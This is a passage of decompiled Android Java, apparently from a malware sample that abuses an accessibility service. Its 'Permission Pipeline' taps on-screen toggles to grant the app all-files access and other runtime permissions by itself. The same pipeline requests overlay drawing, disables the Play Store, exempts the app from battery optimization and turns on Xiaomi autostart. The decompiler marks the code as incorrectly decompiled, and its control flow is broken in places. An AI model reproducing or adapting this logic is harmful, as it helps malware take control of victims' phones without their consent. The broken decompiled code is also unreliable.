    /* JADX WARN: Removed duplicated region for block: B:106:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:107:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:108:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01e3  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x0246 A[RETURN] */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212127a7(int i, ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$enableExtraStrgBtmob$1 genericSteps$enableExtraStrgBtmob$1;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        C1351vv c1351vv;
        C0364a1 c0364a1;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        C1351vv c1351vv2;
        AccessibilityNodeInfo accessibilityNodeInfo3;
        C0364a1 c0364a12;
        Object next;
        int i2;
        int i3 = i;
        C1351vv c1351vv3 = C1351vv.f60710b1;
        if (continuationImpl instanceof GenericSteps$enableExtraStrgBtmob$1) {
            genericSteps$enableExtraStrgBtmob$1 = (GenericSteps$enableExtraStrgBtmob$1) continuationImpl;
            int i4 = genericSteps$enableExtraStrgBtmob$1.f53892a4;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                genericSteps$enableExtraStrgBtmob$1.f53892a4 = i4 - Integer.MIN_VALUE;
            } else {
                genericSteps$enableExtraStrgBtmob$1 = new GenericSteps$enableExtraStrgBtmob$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$enableExtraStrgBtmob$1.f53890a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (genericSteps$enableExtraStrgBtmob$1.f53892a4) {
            case 0:
                kg1.m213544f4(obj);
                if (i3 > 30 || ((Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) || (rootInActiveWindow = this.f55047a0.getRootInActiveWindow()) == null)) {
                    return c1351vv3;
                }
                String lowerCase = m212137c1().toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                String str = this.f55049a2;
                t60.m214704c5(str, "[文件访问] 列表页找App retry=" + i3 + ", appLabel='" + lowerCase + "'");
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(lowerCase);
                if (listFindAccessibilityNodeInfosByText != null) {
                    Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                    while (true) {
                        if (it.hasNext()) {
                            next = it.next();
                            if (((AccessibilityNodeInfo) next).isVisibleToUser()) {
                            }
                        } else {
                            next = null;
                        }
                    }
                    accessibilityNodeInfo = (AccessibilityNodeInfo) next;
                } else {
                    accessibilityNodeInfo = null;
                }
                if (accessibilityNodeInfo != null) {
                    Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                    int iCenterX = rectM24a5.centerX();
                    int iCenterY = rectM24a5.centerY();
                    StringBuilder sbM40c1 = AbstractC0003a2.m40c1("[文件访问] 找到App '", lowerCase, "' 位置(", iCenterX, ", ");
                    sbM40c1.append(iCenterY);
                    sbM40c1.append(")");
                    t60.m214704c5(str, sbM40c1.toString());
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    ArrayList arrayList = new ArrayList();
                    int i5 = 0;
                    m212116b7(0, rootInActiveWindow, arrayList);
                    int size = arrayList.size();
                    while (true) {
                        if (i5 < size) {
                            Object obj2 = arrayList.get(i5);
                            i5++;
                            accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj2;
                            Rect rectM24a52 = AbstractC0003a2.m24a5(accessibilityNodeInfo3);
                            accessibilityNodeInfo2 = rootInActiveWindow;
                            c1351vv2 = c1351vv3;
                            if (rectM24a52.top >= rect.bottom || rectM24a52.bottom <= rect.top) {
                                rootInActiveWindow = accessibilityNodeInfo2;
                                c1351vv3 = c1351vv2;
                            }
                        } else {
                            accessibilityNodeInfo2 = rootInActiveWindow;
                            c1351vv2 = c1351vv3;
                            accessibilityNodeInfo3 = null;
                        }
                    }
                    if (accessibilityNodeInfo3 == null) {
                        Rect rectM24a53 = AbstractC0003a2.m24a5(accessibilityNodeInfo2);
                        int iWidth = rectM24a53.right - (rectM24a53.width() / 8);
                        t60.m214704c5(str, AbstractC0003a2.m31b2("[文件访问] 未找到同行开关，点击右侧开关位置(", iWidth, ", ", rectM24a5.centerY(), ")"));
                        m212123a2(iWidth, rectM24a5.centerY());
                        genericSteps$enableExtraStrgBtmob$1.f53888a0 = this;
                        genericSteps$enableExtraStrgBtmob$1.f53889a1 = i3;
                        genericSteps$enableExtraStrgBtmob$1.f53892a4 = 2;
                        if (b81.m210571b1(1500L, genericSteps$enableExtraStrgBtmob$1) != coroutineSingletons) {
                            c0364a12 = this;
                            i2 = 30;
                            if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
                                t60.m214704c5(c0364a12.f55049a2, "[文件访问] ✅ 点击行后权限已授予");
                                return c1351vv2;
                            }
                            if (i3 < i2) {
                            }
                        }
                    } else {
                        if (accessibilityNodeInfo3.isCheckable() && accessibilityNodeInfo3.isChecked()) {
                            t60.m214704c5(str, "[文件访问] ✅ App旁开关已选中");
                            return c1351vv2;
                        }
                        Rect rectM24a54 = AbstractC0003a2.m24a5(accessibilityNodeInfo3);
                        t60.m214704c5(str, AbstractC0003a2.m31b2("[文件访问] 点击App旁未选中开关(", rectM24a54.centerX(), ", ", rectM24a54.centerY(), ")"));
                        m212123a2(rectM24a54.centerX(), rectM24a54.centerY());
                        genericSteps$enableExtraStrgBtmob$1.f53888a0 = this;
                        genericSteps$enableExtraStrgBtmob$1.f53889a1 = i3;
                        genericSteps$enableExtraStrgBtmob$1.f53892a4 = 1;
                        if (b81.m210571b1(1500L, genericSteps$enableExtraStrgBtmob$1) != coroutineSingletons) {
                            c0364a12 = this;
                            if (Build.VERSION.SDK_INT < 30 && Environment.isExternalStorageManager()) {
                                t60.m214704c5(c0364a12.f55049a2, "[文件访问] ✅ 权限已授予");
                                return c1351vv2;
                            }
                            i2 = 30;
                            if (i3 < i2) {
                                return c1351vv2;
                            }
                            genericSteps$enableExtraStrgBtmob$1.f53888a0 = c0364a12;
                            genericSteps$enableExtraStrgBtmob$1.f53889a1 = i3;
                            genericSteps$enableExtraStrgBtmob$1.f53892a4 = 3;
                            if (b81.m210571b1(500L, genericSteps$enableExtraStrgBtmob$1) != coroutineSingletons) {
                                genericSteps$enableExtraStrgBtmob$1.f53888a0 = null;
                                genericSteps$enableExtraStrgBtmob$1.f53892a4 = 4;
                                if (c0364a12.m212127a7(i3 + 1, genericSteps$enableExtraStrgBtmob$1) != coroutineSingletons) {
                                    return c1351vv2;
                                }
                            }
                        }
                    }
                } else {
                    c1351vv = c1351vv3;
                    t60.m214704c5(str, "[文件访问] 未找到App '" + lowerCase + "'，下滑列表 (retry=" + i3 + ")");
                    m212121c6(rootInActiveWindow);
                    genericSteps$enableExtraStrgBtmob$1.f53888a0 = this;
                    genericSteps$enableExtraStrgBtmob$1.f53889a1 = i3;
                    genericSteps$enableExtraStrgBtmob$1.f53892a4 = 5;
                    if (b81.m210571b1(800L, genericSteps$enableExtraStrgBtmob$1) != coroutineSingletons) {
                        c0364a1 = this;
                        genericSteps$enableExtraStrgBtmob$1.f53888a0 = null;
                        genericSteps$enableExtraStrgBtmob$1.f53892a4 = 6;
                        if (c0364a1.m212127a7(i3 + 1, genericSteps$enableExtraStrgBtmob$1) == coroutineSingletons) {
                            return c1351vv;
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                i3 = genericSteps$enableExtraStrgBtmob$1.f53889a1;
                c0364a12 = genericSteps$enableExtraStrgBtmob$1.f53888a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv3;
                if (Build.VERSION.SDK_INT < 30) {
                    break;
                }
                i2 = 30;
                if (i3 < i2) {
                }
                break;
            case 2:
                i3 = genericSteps$enableExtraStrgBtmob$1.f53889a1;
                c0364a12 = genericSteps$enableExtraStrgBtmob$1.f53888a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv3;
                i2 = 30;
                if (Build.VERSION.SDK_INT >= 30) {
                    t60.m214704c5(c0364a12.f55049a2, "[文件访问] ✅ 点击行后权限已授予");
                    return c1351vv2;
                }
                if (i3 < i2) {
                }
                break;
            case 3:
                i3 = genericSteps$enableExtraStrgBtmob$1.f53889a1;
                c0364a12 = genericSteps$enableExtraStrgBtmob$1.f53888a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv3;
                genericSteps$enableExtraStrgBtmob$1.f53888a0 = null;
                genericSteps$enableExtraStrgBtmob$1.f53892a4 = 4;
                if (c0364a12.m212127a7(i3 + 1, genericSteps$enableExtraStrgBtmob$1) != coroutineSingletons) {
                    return coroutineSingletons;
                }
                break;
            case 4:
                kg1.m213544f4(obj);
                return c1351vv3;
            case 5:
                i3 = genericSteps$enableExtraStrgBtmob$1.f53889a1;
                c0364a1 = genericSteps$enableExtraStrgBtmob$1.f53888a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv3;
                genericSteps$enableExtraStrgBtmob$1.f53888a0 = null;
                genericSteps$enableExtraStrgBtmob$1.f53892a4 = 6;
                if (c0364a1.m212127a7(i3 + 1, genericSteps$enableExtraStrgBtmob$1) == coroutineSingletons) {
                }
                break;
            case 6:
                kg1.m213544f4(obj);
                return c1351vv3;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:102:0x01d1  */
    /* JADX WARN: Removed duplicated region for block: B:103:0x01d4  */
    /* JADX WARN: Removed duplicated region for block: B:113:0x0202  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00de  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x00f9  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00fb A[Catch: Exception -> 0x004a, PHI: r0 r5 r11
      0x00fb: PHI (r0v16 java.lang.Object) = (r0v12 java.lang.Object), (r0v1 java.lang.Object) binds: [B:54:0x00f7, B:35:0x0076] A[DONT_GENERATE, DONT_INLINE]
      0x00fb: PHI (r5v16 int) = (r5v12 int), (r5v19 int) binds: [B:54:0x00f7, B:35:0x0076] A[DONT_GENERATE, DONT_INLINE]
      0x00fb: PHI (r11v7 com.storm.safe.rock.service.modules.yw5xud.a1) = (r11v4 com.storm.safe.rock.service.modules.yw5xud.a1), (r11v8 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:54:0x00f7, B:35:0x0076] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0103  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0118  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x011a A[Catch: Exception -> 0x004a, PHI: r0 r5 r11
      0x011a: PHI (r0v22 java.lang.Object) = (r0v21 java.lang.Object), (r0v1 java.lang.Object) binds: [B:60:0x0116, B:32:0x006d] A[DONT_GENERATE, DONT_INLINE]
      0x011a: PHI (r5v20 int) = (r5v17 int), (r5v23 int) binds: [B:60:0x0116, B:32:0x006d] A[DONT_GENERATE, DONT_INLINE]
      0x011a: PHI (r11v9 com.storm.safe.rock.service.modules.yw5xud.a1) = (r11v7 com.storm.safe.rock.service.modules.yw5xud.a1), (r11v10 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:60:0x0116, B:32:0x006d] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0122  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x0137  */
    /* JADX WARN: Removed duplicated region for block: B:68:0x0139 A[Catch: Exception -> 0x004a, PHI: r0 r5 r11
      0x0139: PHI (r0v28 java.lang.Object) = (r0v27 java.lang.Object), (r0v1 java.lang.Object) binds: [B:66:0x0135, B:29:0x0064] A[DONT_GENERATE, DONT_INLINE]
      0x0139: PHI (r5v24 int) = (r5v21 int), (r5v27 int) binds: [B:66:0x0135, B:29:0x0064] A[DONT_GENERATE, DONT_INLINE]
      0x0139: PHI (r11v11 com.storm.safe.rock.service.modules.yw5xud.a1) = (r11v9 com.storm.safe.rock.service.modules.yw5xud.a1), (r11v12 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:66:0x0135, B:29:0x0064] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0141  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x0156  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0157 A[Catch: Exception -> 0x004a, PHI: r0 r5 r11
      0x0157: PHI (r0v34 java.lang.Object) = (r0v33 java.lang.Object), (r0v1 java.lang.Object) binds: [B:72:0x0154, B:26:0x005b] A[DONT_GENERATE, DONT_INLINE]
      0x0157: PHI (r5v28 int) = (r5v25 int), (r5v31 int) binds: [B:72:0x0154, B:26:0x005b] A[DONT_GENERATE, DONT_INLINE]
      0x0157: PHI (r11v13 com.storm.safe.rock.service.modules.yw5xud.a1) = (r11v11 com.storm.safe.rock.service.modules.yw5xud.a1), (r11v14 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:72:0x0154, B:26:0x005b] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:76:0x015f  */
    /* JADX WARN: Removed duplicated region for block: B:79:0x0174  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0175 A[Catch: Exception -> 0x004a, PHI: r0 r5 r11
      0x0175: PHI (r0v40 java.lang.Object) = (r0v39 java.lang.Object), (r0v1 java.lang.Object) binds: [B:78:0x0172, B:23:0x0052] A[DONT_GENERATE, DONT_INLINE]
      0x0175: PHI (r5v32 int) = (r5v29 int), (r5v35 int) binds: [B:78:0x0172, B:23:0x0052] A[DONT_GENERATE, DONT_INLINE]
      0x0175: PHI (r11v15 com.storm.safe.rock.service.modules.yw5xud.a1) = (r11v13 com.storm.safe.rock.service.modules.yw5xud.a1), (r11v16 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:78:0x0172, B:23:0x0052] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:82:0x017d  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0192  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0193 A[Catch: Exception -> 0x004a, PHI: r0 r5 r11
      0x0193: PHI (r0v46 java.lang.Object) = (r0v45 java.lang.Object), (r0v1 java.lang.Object) binds: [B:84:0x0190, B:18:0x0045] A[DONT_GENERATE, DONT_INLINE]
      0x0193: PHI (r5v36 int) = (r5v33 int), (r5v39 int) binds: [B:84:0x0190, B:18:0x0045] A[DONT_GENERATE, DONT_INLINE]
      0x0193: PHI (r11v17 com.storm.safe.rock.service.modules.yw5xud.a1) = (r11v15 com.storm.safe.rock.service.modules.yw5xud.a1), (r11v18 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:84:0x0190, B:18:0x0045] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x019b  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x01a5 A[Catch: Exception -> 0x004a, TRY_LEAVE, TryCatch #2 {Exception -> 0x004a, blocks: (B:18:0x0045, B:86:0x0193, B:89:0x019c, B:91:0x01a5, B:23:0x0052, B:80:0x0175, B:83:0x017e, B:26:0x005b, B:74:0x0157, B:77:0x0160, B:29:0x0064, B:68:0x0139, B:71:0x0142, B:32:0x006d, B:62:0x011a, B:65:0x0123, B:35:0x0076, B:56:0x00fb, B:59:0x0104, B:38:0x007f, B:47:0x00d6, B:53:0x00e6), top: B:120:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01c5  */
    /* JADX WARN: Removed duplicated region for block: B:98:0x01c7  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x01c9  */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212128a8(ContinuationImpl continuationImpl) {
        GenericSteps$execute$1 genericSteps$execute$1;
        C0364a1 c0364a1;
        int i;
        C0364a1 c0364a12;
        int i2;
        if (continuationImpl instanceof GenericSteps$execute$1) {
            genericSteps$execute$1 = (GenericSteps$execute$1) continuationImpl;
            int i3 = genericSteps$execute$1.f53897a4;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                genericSteps$execute$1.f53897a4 = i3 - Integer.MIN_VALUE;
            } else {
                genericSteps$execute$1 = new GenericSteps$execute$1(this, continuationImpl);
            }
        }
        Object objM212135b5 = genericSteps$execute$1.f53895a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        try {
        } catch (Exception e) {
            e = e;
            c0364a1 = c0364a12;
        }
        switch (genericSteps$execute$1.f53897a4) {
            case 0:
                kg1.m213544f4(objM212135b5);
                String str = this.f55049a2;
                t60.m214704c5(str, "╔════════════════════════════════════════════════════════════");
                t60.m214704c5(str, "║ Permission Pipeline — GenericSteps");
                String str2 = Build.BRAND;
                String str3 = Build.MODEL;
                int i4 = Build.VERSION.SDK_INT;
                String language = Locale.getDefault().getLanguage();
                StringBuilder sbM41c2 = AbstractC0003a2.m41c2("║ ", str2, " / ", str3, " / Android ");
                sbM41c2.append(i4);
                sbM41c2.append(" / ");
                sbM41c2.append(language);
                t60.m214704c5(str, sbM41c2.toString());
                t60.m214704c5(str, "╚════════════════════════════════════════════════════════════");
                try {
                } catch (Exception e2) {
                    e = e2;
                    c0364a1 = this;
                    tz0.m214808a8("Pipeline异常: ", e.getMessage(), c0364a1.f55049a2, e);
                    i = 0;
                    try {
                        c0364a1.f55047a0.performGlobalAction(2);
                    } catch (Exception e3) {
                        tz0.m214807a7("返回主页失败: ", e3.getMessage(), c0364a1.f55049a2);
                    }
                    return Boolean.valueOf(i != 0);
                }
                if (!m212120c4()) {
                    c0364a12 = this;
                    i = 1;
                    t60.m214704c5(c0364a12.f55049a2, "[Job3] Files permission...");
                    genericSteps$execute$1.f53893a0 = c0364a12;
                    genericSteps$execute$1.f53894a1 = i;
                    genericSteps$execute$1.f53897a4 = 2;
                    objM212135b5 = c0364a12.m212129a9(genericSteps$execute$1);
                    if (objM212135b5 != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                t60.m214704c5(str, "[Xiaomi] AutoStart management...");
                genericSteps$execute$1.f53893a0 = this;
                genericSteps$execute$1.f53894a1 = 1;
                genericSteps$execute$1.f53897a4 = 1;
                objM212135b5 = m212135b5(genericSteps$execute$1);
                if (objM212135b5 != coroutineSingletons) {
                    c0364a12 = this;
                    i = 1;
                    if (!((Boolean) objM212135b5).booleanValue()) {
                        i = 0;
                    }
                    t60.m214704c5(c0364a12.f55049a2, "[Job3] Files permission...");
                    genericSteps$execute$1.f53893a0 = c0364a12;
                    genericSteps$execute$1.f53894a1 = i;
                    genericSteps$execute$1.f53897a4 = 2;
                    objM212135b5 = c0364a12.m212129a9(genericSteps$execute$1);
                    if (objM212135b5 != coroutineSingletons) {
                        if (!((Boolean) objM212135b5).booleanValue()) {
                            i = 0;
                        }
                        t60.m214704c5(c0364a12.f55049a2, "[Job4] Runtime permissions...");
                        genericSteps$execute$1.f53893a0 = c0364a12;
                        genericSteps$execute$1.f53894a1 = i;
                        genericSteps$execute$1.f53897a4 = 3;
                        objM212135b5 = c0364a12.m212130b0(genericSteps$execute$1);
                        if (objM212135b5 == coroutineSingletons) {
                            if (!((Boolean) objM212135b5).booleanValue()) {
                                i = 0;
                            }
                            t60.m214704c5(c0364a12.f55049a2, "[Job5] Draw overlay...");
                            genericSteps$execute$1.f53893a0 = c0364a12;
                            genericSteps$execute$1.f53894a1 = i;
                            genericSteps$execute$1.f53897a4 = 4;
                            objM212135b5 = c0364a12.m212133b3(genericSteps$execute$1);
                            if (objM212135b5 == coroutineSingletons) {
                                if (!((Boolean) objM212135b5).booleanValue()) {
                                    i = 0;
                                }
                                t60.m214704c5(c0364a12.f55049a2, "[Job7] Disable Play Store...");
                                genericSteps$execute$1.f53893a0 = c0364a12;
                                genericSteps$execute$1.f53894a1 = i;
                                genericSteps$execute$1.f53897a4 = 5;
                                objM212135b5 = c0364a12.m212134b4(genericSteps$execute$1);
                                if (objM212135b5 == coroutineSingletons) {
                                    if (!((Boolean) objM212135b5).booleanValue()) {
                                        i = 0;
                                    }
                                    t60.m214704c5(c0364a12.f55049a2, "[Job8] Battery optimization...");
                                    genericSteps$execute$1.f53893a0 = c0364a12;
                                    genericSteps$execute$1.f53894a1 = i;
                                    genericSteps$execute$1.f53897a4 = 6;
                                    objM212135b5 = c0364a12.m212131b1(genericSteps$execute$1);
                                    if (objM212135b5 == coroutineSingletons) {
                                        if (!((Boolean) objM212135b5).booleanValue()) {
                                            i = 0;
                                        }
                                        t60.m214704c5(c0364a12.f55049a2, "[Job9] Notification channel...");
                                        genericSteps$execute$1.f53893a0 = c0364a12;
                                        genericSteps$execute$1.f53894a1 = i;
                                        genericSteps$execute$1.f53897a4 = 7;
                                        objM212135b5 = c0364a12.m212132b2(genericSteps$execute$1);
                                        if (objM212135b5 == coroutineSingletons) {
                                            if (!((Boolean) objM212135b5).booleanValue()) {
                                                i = 0;
                                            }
                                            c0364a12.getClass();
                                            if (m212120c4()) {
                                                c0364a1 = c0364a12;
                                                String str4 = c0364a1.f55049a2;
                                                t60.m214704c5(str4, "╔════════════════════════════════════════════════════════════");
                                                t60.m214704c5(str4, "║ Pipeline完成: ".concat(i != 0 ? "全部成功" : "部分失败"));
                                                t60.m214704c5(str4, "╚════════════════════════════════════════════════════════════");
                                                c0364a1.f55047a0.performGlobalAction(2);
                                                return Boolean.valueOf(i != 0);
                                            }
                                            t60.m214704c5(c0364a12.f55049a2, "[Xiaomi] Background management...");
                                            genericSteps$execute$1.f53893a0 = c0364a12;
                                            genericSteps$execute$1.f53894a1 = i;
                                            genericSteps$execute$1.f53897a4 = 8;
                                            objM212135b5 = c0364a12.m212136b6(genericSteps$execute$1);
                                            if (objM212135b5 != coroutineSingletons) {
                                                i2 = i;
                                                c0364a1 = c0364a12;
                                                i = ((Boolean) objM212135b5).booleanValue() ? 0 : i2;
                                                String str42 = c0364a1.f55049a2;
                                                t60.m214704c5(str42, "╔════════════════════════════════════════════════════════════");
                                                t60.m214704c5(str42, "║ Pipeline完成: ".concat(i != 0 ? "全部成功" : "部分失败"));
                                                t60.m214704c5(str42, "╚════════════════════════════════════════════════════════════");
                                                c0364a1.f55047a0.performGlobalAction(2);
                                                return Boolean.valueOf(i != 0);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                t60.m214704c5(c0364a12.f55049a2, "[Job3] Files permission...");
                genericSteps$execute$1.f53893a0 = c0364a12;
                genericSteps$execute$1.f53894a1 = i;
                genericSteps$execute$1.f53897a4 = 2;
                objM212135b5 = c0364a12.m212129a9(genericSteps$execute$1);
                if (objM212135b5 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                t60.m214704c5(c0364a12.f55049a2, "[Job4] Runtime permissions...");
                genericSteps$execute$1.f53893a0 = c0364a12;
                genericSteps$execute$1.f53894a1 = i;
                genericSteps$execute$1.f53897a4 = 3;
                objM212135b5 = c0364a12.m212130b0(genericSteps$execute$1);
                if (objM212135b5 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                t60.m214704c5(c0364a12.f55049a2, "[Job5] Draw overlay...");
                genericSteps$execute$1.f53893a0 = c0364a12;
                genericSteps$execute$1.f53894a1 = i;
                genericSteps$execute$1.f53897a4 = 4;
                objM212135b5 = c0364a12.m212133b3(genericSteps$execute$1);
                if (objM212135b5 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                t60.m214704c5(c0364a12.f55049a2, "[Job7] Disable Play Store...");
                genericSteps$execute$1.f53893a0 = c0364a12;
                genericSteps$execute$1.f53894a1 = i;
                genericSteps$execute$1.f53897a4 = 5;
                objM212135b5 = c0364a12.m212134b4(genericSteps$execute$1);
                if (objM212135b5 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                t60.m214704c5(c0364a12.f55049a2, "[Job8] Battery optimization...");
                genericSteps$execute$1.f53893a0 = c0364a12;
                genericSteps$execute$1.f53894a1 = i;
                genericSteps$execute$1.f53897a4 = 6;
                objM212135b5 = c0364a12.m212131b1(genericSteps$execute$1);
                if (objM212135b5 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                t60.m214704c5(c0364a12.f55049a2, "[Job9] Notification channel...");
                genericSteps$execute$1.f53893a0 = c0364a12;
                genericSteps$execute$1.f53894a1 = i;
                genericSteps$execute$1.f53897a4 = 7;
                objM212135b5 = c0364a12.m212132b2(genericSteps$execute$1);
                if (objM212135b5 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                i = genericSteps$execute$1.f53894a1;
                c0364a12 = genericSteps$execute$1.f53893a0;
                kg1.m213544f4(objM212135b5);
                if (!((Boolean) objM212135b5).booleanValue()) {
                }
                c0364a12.getClass();
                if (m212120c4()) {
                }
                break;
            case 8:
                i2 = genericSteps$execute$1.f53894a1;
                c0364a1 = genericSteps$execute$1.f53893a0;
                try {
                    kg1.m213544f4(objM212135b5);
                    if (((Boolean) objM212135b5).booleanValue()) {
                    }
                    String str422 = c0364a1.f55049a2;
                    t60.m214704c5(str422, "╔════════════════════════════════════════════════════════════");
                    t60.m214704c5(str422, "║ Pipeline完成: ".concat(i != 0 ? "全部成功" : "部分失败"));
